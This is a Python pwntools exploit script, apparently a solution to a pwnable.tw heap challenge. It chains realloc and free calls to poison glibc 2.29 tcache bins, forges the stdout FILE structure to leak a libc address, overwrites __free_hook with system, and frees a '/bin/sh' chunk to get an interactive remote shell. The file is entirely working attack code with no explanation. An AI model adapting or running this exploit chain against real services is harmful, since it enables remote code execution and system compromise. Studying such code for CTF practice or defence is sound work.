from pwn import *

###Util
def create(idx,size,data):
    r.sendlineafter('choice: ','1')
    r.sendlineafter('Index:',str(idx))
    r.sendlineafter('Size:',str(size))
    r.sendafter('Data:',data)

def realloc(idx,size,data):
    r.sendlineafter('choice: ','2')
    r.sendlineafter('Index:',str(idx))
    r.sendlineafter('Size:',str(size))
    if size!=0:
        r.sendafter('Data:',data)
    
def delete(idx):
    r.sendlineafter('choice: ','3')
    r.sendlineafter('Index:',str(idx))

###Addr
#  libc2.29
heap_array_offset = 0x4050
stdout_struct_offset = 0x1e5760
stdout_shortbuf_offset = stdout_struct_offset+0x83
free_hook_offset = 0x1e75a8
system_offset = 0x52fd0

###Exploit
while True:
    r = remote('chall.pwnable.tw',10310)
    create(0,0x48,'M30W')
    realloc(0,0,None)
    realloc(0,0x48,b'\x00'*0x10)
    realloc(0,0,None)
    realloc(0,0x48,b'\xc0')

    create(1,0x48,b'\x00'*0x10)
    realloc(1,0x78,b'\x00'*0x58+p64(0x51))
    delete(1)
    realloc(0,0x78,b'\x00'*0x10)
    delete(0)

    create(1,0x18,'M30W')
    realloc(1,0,None)
    realloc(1,0x18,b'\x00'*0x18)
    realloc(1,0x58,'M30W')
    realloc(1,0,None)
    realloc(1,0x58,b'\x00'*0x10)
    delete(1)

    for i in range(10):
        create(1,0x68,'M30W') 
        realloc(1,0x78,'M30W')
        delete(1)

    create(1,0x48,b'\x00'*0x18+p64(0x461)[:-1])

    create(0,0x58,b'\x00'*0x28+p64(0x21))
    delete(0)

    realloc(1,0x48,b'\x00'*0x18+p64(0x61)+b'\x60\xd7')
    create(0,0x58,'a')

    realloc(1,0x48,b'\x00'*0x18+p64(0x31)+b'\xa0\xf5')
    delete(1)
    create(1,0x18,'M30W')
    delete(0)
    realloc(1,0x28,b'\x00'*0x10)
    delete(1)

    try:
        create(0,0x58,p64(0xfbad3887)+p64(0)*3)
        stdout_shortbuf_addr = u64(r.recvline()[0x88:0x90])
        break
    except:
        r.close()
        continue

libc_base = stdout_shortbuf_addr-stdout_shortbuf_offset
print(hex(libc_base))

create(1,0x18,b'/bin/sh\x00'+p64(libc_base+system_offset))
delete(1)

r.interactive()
